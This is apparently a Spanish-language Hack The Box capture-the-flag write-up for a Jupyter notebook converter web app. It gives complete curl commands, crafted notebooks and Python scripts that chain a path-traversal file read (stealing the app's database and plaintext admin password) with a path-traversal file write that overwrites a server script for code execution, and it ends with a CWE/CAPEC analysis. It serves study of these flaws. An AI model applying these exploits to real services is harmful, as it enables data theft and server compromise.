## Notebook Converter Pro pts[20]

**Descripción del reto en HTB:** "Welcome to NotebookConverter Pro, a tool for converting Jupyter notebooks into different formats with ease. While it appears simple and efficient, there may be more happening behind the scenes than meets the eye."

### Herramientas Utilizadas

- Burp Suite Community
- curl
- python 3
- sqlite3

### 1. Reconocimiento

Al iniciar el target e ingresar la URL se presenta una pantalla de login con un formulario de registro. Se registra un usuario de prueba y se inicia sesión para explorar la superficie de ataque.

Con sesión activa se accede al dashboard. La interfaz es minimalista: un formulario para subir un archivo `.ipynb` y elegir entre `html` y `markdown` como formato de salida. En la barra de navegación no hay enlace a ninguna zona de administración, aunque el rol `admin` podría existir dado que la aplicación distingue entre tipos de usuario.

Se configura Burp Suite como proxy (154.57.164.76:32302) y se navega por toda la aplicación. En se identifican todos los endpoints:

![alt text](images/ncp1.png)

| Método | Endpoint | Notas |
|---|---|---|
| GET / POST | `/` | Login |
| POST | `/register` | Registro |
| GET | `/logout` | Cierre de sesión |
| GET | `/dashboard` | Requiere sesión |
| POST | `/convert` | Subida del notebook |
| GET | `/jobs/<job_id>` | Detalle del job |
| GET | `/jobs/<job_id>/download` | Descarga del resultado |
| GET / POST | `/admin` | Panel admin — devuelve 403 con usuario regular |

Al intentar acceder a `/admin` con el usuario registrado se recibe un **403 Forbidden**, lo que confirma que existe una zona restringida por rol.

![alt text](images/ncp2.png)

Se sube un notebook `.ipynb` legítimo y se intercepta el request. El `POST /convert` es un `multipart/form-data` con dos campos: el archivo y el formato de salida.

```
POST /convert HTTP/1.1
Host: <target>
Cookie: session=<token>
Content-Type: multipart/form-data; boundary=...

...
Content-Disposition: form-data; name="notebook"; filename="test.ipynb"
...contenido del notebook...
...
Content-Disposition: form-data; name="format"

html
...
```
![alt text](images/ncp3.png)

La respuesta es un **302** hacia `/jobs/<job_id>`. Desde ahí se puede descargar el resultado procesado. Entonces el server aceptó el notebook enviado y creó una tarea de procesamiento identificada por un job_id, redirigiendo al usuario a la ruta /jobs/342101d274ff, donde posteriormente puede consultarse o descargarse el resultado generado. El hecho de que la conversión se complete exitosamente, sin errores de validación ni restricciones visibles, puede ser que el servidor analiza y procesa activamente el contenido interno del notebook. Dado que el resultado final depende de lo que contiene el archivo enviado,  es posible que el backend ejecuta o interpreta parte de dicho contenido durante el proceso de conversión. Tal vez, si el notebook incluye referencias a recursos locales o rutas del sistema de archivos, estas podrían ser procesadas por el servidor y reflejarse en la salida generada, lo que justificaría realizar pruebas adicionales para evaluar el alcance de ese acceso.

#### 1.1 Path traversal en referencias de imagen

Los notebooks de Jupyter soportan Markdown, y en Markdown las imágenes se insertan con `![alt](ruta)`. Si el servidor no valida esas rutas al generar el HTML, podría leer archivos arbitrarios del sistema de archivos.

Se puede construir un notebook mínimo a mano apuntando a una alguna direccion:

```bash
cat > test_traversal.ipynb << 'EOF'
{
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "source": ["![](../../../etc/passwd)"]
  }],
  "metadata": {
    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
EOF
```

### 2. Análisis del Código Fuente

Descargando el codigo fuente desde HTB, se analiza el código fuente para entender el mecanismo exacto, identificar qué archivos robar y descubrir si existe otra vulnerabilidad.

#### 2.1 Por qué funciona el AFR `convert_job.py`

```python
def convert_html(input_path, output_dir):
    exporter = nbconvert.HTMLExporter()
    exporter.embed_images = True   
    body, _resources = exporter.from_filename(str(input_path))
    ...
```

Con `embed_images = True`, `nbconvert` resuelve cada referencia `![](ruta)` del notebook, ergo, lee el archivo desde el sistema de archivos de forma literal y lo incrusta como `data:...;base64,...` en el HTML. No hay ninguna validación de ruta, por ejemplo: `../../../../`.

#### 2.2 Qué archivo robar `db.py`

```python
DB_PATH = DATA_DIR / "app.db"

admin_password = secrets.token_urlsafe(14)

conn.execute(
    "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
    ("admin", admin_password, "admin"),
)
```

1. La base de datos está en una ruta predecible: `data/app.db` relativa a la raíz del proyecto.
2. La contraseña del admin se genera aleatoriamente pero se almacena en texto plano, sin ningún hash.

Los notebooks se guardan en `data/jobs/<job_id>/incoming/`. La ruta relativa desde ahí hasta la DB es exactamente `../../../../data/app.db`.

#### 2.3 `FilesWriter` escribe rutas sin validar

En `services/conversions.py` hay una configuración oculta activable solo por el admin:

```python
def determine_storage_mode(output_format):
    if output_format == "markdown":
        return "saved_assets" if setting_enabled("asset_storage_enabled") else "single_file"
    return "single_file"
```

Cuando `asset_storage_enabled` está activo y el formato es Markdown, `convert_job.py` usa la clase `FilesWriter` de nbconvert, en la funcion `convert_markdown()`:

```python
writer = FilesWriter(build_directory=str(output_dir))
writer.write(body, resources, notebook_name=input_path.stem)
```

`FilesWriter` escribe los attachments del notebook en disco usando el nombre de clave del attachment como nombre de archivo, concatenándolo directamente con `build_directory` sin ninguna validación de path traversal. Si el nombre del attachment es `../../../../app/converter/convert_job.py`, el archivo se escribe fuera del directorio de exports y sobreescribe el script legítimo.

Ese script es ejecutado como subproceso en cada conversión:

```python
# services/conversions.py
subprocess.run([sys.executable, str(CONVERTER_SCRIPT), "--input", ..., "--output-dir", ...])
```

Esto convierte el path traversal en escritura en un Remote Code Execution, es decir, sobreescribir el script para que la próxima conversión ejecute el código del atacante.

Sin embargo, esta funcionalidad está desactivada por defecto (`asset_storage_enabled = 0`) y solo el admin puede activarla. Por eso el primer objetivo es robar la DB y obtener las credenciales de admin antes de intentar el file write.



### 3. Exploit

El exploit se divide en tres fases: Exfiltrar la base de datos usando el AFR descubierto, escalar a admin con las credenciales robadas, y finalmente convertir el path traversal de escritura en ejecución de código.

#### 3.1. Registro y login de usuario de prueba

```bash
TARGET="http://154.57.164.74:32480"

# Registro del usuario de ataque
curl -s -X POST "$TARGET/register" -c /tmp/user_cookies.txt \
  -d "username=$USER&password=$PASS&confirm_password=$PASS"

# Login — guarda la cookie de sesión en /tmp/c.txt
curl -s -X POST "$TARGET/" -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
  -d "username=$USER&password=$PASS" -L -o /dev/null
```

![alt text](images/ncp4.png)


#### 3.2. Construir el notebook para robar la DB

El análisis de `convert_job.py` reveló que `embed_images = True` hace que nbconvert resuelva rutas de imagen en el sistema de archivos del servidor sin validación. La base de datos se ubica en `data/app.db` y los notebooks se guardan en `data/jobs/<job_id>/incoming/`, por lo que la ruta relativa para alcanzarla es exactamente `../../../../data/app.db`. Se construye el notebook mínimo que explota esa lectura:

```bash
cat > /tmp/steal.ipynb << 'NOTEBOOK'
{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": ["![](../../../../data/app.db)"]
    }
  ],
  "metadata": {
    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
NOTEBOOK
```

#### 3.3 Subir el notebook y descargar el HTML con la DB embebida

Se sube el notebook al endpoint /convert que identificamos en el reconocimiento. El servidor responde con un 302 hacia `/jobs/<job_id>`, el mismo flujo observado con el notebook legítimo. La diferencia es que ahora nbconvert incrustará el contenido binario de la base de datos como un blob data:`...;base64,...` dentro del HTML generado:

```bash
# Subir el notebook malicioso
curl -s -X POST "$TARGET/convert" \
  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -D /tmp/headers.txt -o /dev/null

# Extraer el job_id del header Location del redirect
JOB_ID=$(grep -i 'location:' /tmp/headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "job: $JOB_ID"

# Descargar el HTML con la DB embebida
curl -s "$TARGET/jobs/$JOB_ID/download" \
  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
  -o /tmp/db_out.html

echo "$(wc -c < /tmp/db_out.html) bytes -> /tmp/db_out.html"
```

![alt text](images/ncp5.png)

#### 3.4. Extraer la contraseña del admin de la DB robada

El HTML de salida contiene múltiples blobs base64 correspondientes a recursos del tema de nbconvert (fuentes, íconos, CSS) además del archivo que nos interesa. Se itera sobre todos ellos buscando la firma SQLite al inicio del contenido decodificado. Una vez encontrado, se conecta directamente a la base de datos en memoria. El análisis del código ya había confirmado que `db.py` almacena la contraseña del admin en texto plano, así que la extracción es directa:

```python
# extract_creds.py
import re, base64, sqlite3

html = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
matches = re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html)

for m in matches:
    try:
        data = base64.b64decode(m)
    except Exception:
        continue

    if data[:6] == b'SQLite':
        open('/tmp/stolen.db', 'wb').write(data)
        conn = sqlite3.connect('/tmp/stolen.db')
        for row in conn.execute("SELECT username, password, role FROM users"):
            print(f"{row[0]}:{row[1]} ({row[2]})")
        conn.close()
        break
```

![alt text](images/ncp6.png)



#### 3.5. Login como admin y activar `asset_storage_enabled`
Con las credenciales en mano se inicia sesión como admin. El reconocimiento mostró que `/admin` devuelve 403 a usuarios regulares; ahora ese panel es accesible. Se activa el setting `asset_storage_enabled`, la condición que el análisis de `services/conversions.py` identificó como prerequisito para que el conversor use `FilesWriter` en lugar del modo de archivo único, habilitando así la segunda vulnerabilidad de path traversal:

```bash
ADMIN_PASS="IGD40-eerRdFR5upjG0"

curl -s -X POST "$TARGET/" -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -d "username=admin&password=$ADMIN_PASS" -L -o /dev/null

curl -s -X POST "$TARGET/admin" -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -d "asset_storage_enabled=on" -o /dev/null
```

![alt text](images/ncp7.png)


#### 3.6. Construir el notebook con el payload RCE

El análisis reveló que `FilesWriter` concatena la clave del attachment directamente con build_directory sin sanitizar separadores de ruta. La clave `../../../../app/converter/convert_job.py`, al resolverse desde el directorio de exports del job, apunta exactamente al script legítimo. El contenido del attachment reemplazará ese script.
El payload debe respetar el contrato de `conversions.py`: el script recibe `--output-dir` como argumento y debe imprimir `{"status": "ok", "output_path": "..."}` en stdout para que el job sea marcado como completado y el archivo quede disponible en `/download`:

```python
import json, base64

code = r"""import subprocess, json, argparse
from pathlib import Path

r = subprocess.run(['/readflag'], capture_output=True, text=True)
flag = r.stdout.strip()

parser = argparse.ArgumentParser()
parser.add_argument('--output-dir', required=False)
args, _ = parser.parse_known_args()

if args.output_dir:
    out = Path(args.output_dir) / 'flag.html'
    out.write_text(f'<html><body><h1>{flag}</h1></body></html>')
    print(json.dumps({"status": "ok", "output_path": str(out)}))
"""

nb = {
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "attachments": {
      "../../../../app/converter/convert_job.py": {
        "application/octet-stream": base64.b64encode(code.encode()).decode()
      }
    },
    "source": ["# x"]
  }],
  "metadata": {
    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}

json.dump(nb, open('/tmp/pwn.ipynb', 'w'), indent=2)
print("[+] /tmp/pwn.ipynb")
```

#### 3.7. Subir `pwn.ipynb` para sobreescribir el script
Se sube con formato markdown, la condición exacta que activa el uso de `FilesWriter` según `determine_storage_mode()`. El job se completa y en ese momento `convert_job.py` en el servidor ya es el payload del atacante:

```bash
curl -s -X POST "$TARGET/convert" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -F "notebook=@/tmp/pwn.ipynb" \
  -F "format=markdown" \
  -D /tmp/pwn_headers.txt -o /dev/null

JOB_ID=$(grep -i 'location:' /tmp/pwn_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "pwn job: $JOB_ID"
```

#### 3.8. Triggear el RCE enviando cualquier conversión

Con el script reemplazado, `conversions.py` invocará el payload la próxima vez que lance un subproceso. Se reutiliza `steal.ipynb`, aunque cualquier notebook sirve, ya que el código que se ejecuta ya no es el conversor legítimo sino el payload. El resultado descargable será el HTML con la flag:

```bash
curl -s -X POST "$TARGET/convert" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -D /tmp/rce_headers.txt -o /dev/null

JOB_ID=$(grep -i 'location:' /tmp/rce_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "job: $JOB_ID"

curl -s "$TARGET/jobs/$JOB_ID/download" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -o /tmp/flag_out.html
```

#### 3.9 Flag

```bash
grep -oP 'HTB\{[^}]+\}' /tmp/flag_out.html
```

```
FLAG: HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}
```

![alt text](images/ncp8.png)

![alt text](images/ncp9.png)

### Vulnerabilidades

1. Path Traversal en embed_images (CWE-22 / CAPEC-126)

La primera vulnerabilidad es un caso clásico de CWE-22: Improper Limitation of a Pathname to a Restricted Directory. `convert_job.py` configura `nbconvert` con `embed_images = True` y pasa la ruta de imagen del notebook directamente al sistema de archivos sin ningún proceso de validacion de que la ruta resultante permanezca dentro de un directorio seguro. Un atacante puede incluir secuencias `../` para salir del directorio de trabajo y leer archivos arbitrarios del servidor.
El patrón de ataque corresponde a CAPEC-126: Path Traversal, que describe precisamente el abuso de separadores de directorio y secuencias de punto-punto para navegar fuera del árbol de archivos previsto. En este caso el impacto es la lectura completa de `data/app.db`, incluyendo credenciales de todos los usuarios.

2. Contraseña almacenada en texto plano (CWE-256)

`db.py` genera la contraseña del admin con secrets.`token_urlsafe(14)`, pero la persiste en la base de datos sin aplicar ninguna función de derivación de clave (bcrypt, argon2, PBKDF2). Esto encaja en CWE-256: Plaintext Storage of a Password: la fortaleza del secreto generado queda completamente anulada en cuanto un atacante obtiene acceso de lectura al almacén.
No existe un CAPEC directamente asociado porque esta debilidad no es una técnica de ataque, robar la base de datos no habría entregado credenciales utilizables. Con ella, la primera vulnerabilidad escala automáticamente a compromiso total de la cuenta admin.

3. Path Traversal en `FilesWriter` (CWE-22 y CWE-94 / CAPEC-17 y CAPEC-253)

La tercera vulnerabilidad combina dos debilidades. La primera sigue siendo CWE-22, ahora en la fase de escritura: `FilesWriter` concatena la clave del attachment con el `build_directory` del job sin validar si el path resultante sale del directorio de exports. La segunda es CWE-94: Improper Control of Generation of Code, porque el archivo sobreescrito `convert_job.py` es invocado por el servidor como subproceso en cada conversión posterior, convirtiendo la escritura arbitraria de archivos en ejecución de código arbitrario.
El primer patrón de ataque asociado es CAPEC-17: Using Malicious Files, que cubre la introducción de archivos con contenido malicioso que el sistema objetivo termina procesando o ejecutando. El segundo es CAPEC-253: Remote Code Inclusion, que describe la sustitución o inyección de código en rutas que la aplicación carga y ejecuta dinámicamente. Aquí ambos patrones se materializan juntos: el notebook actúa como el archivo malicioso portador del payload, y la ejecución vía subprocess.run en el siguiente job es la inclusión remota de ese código.

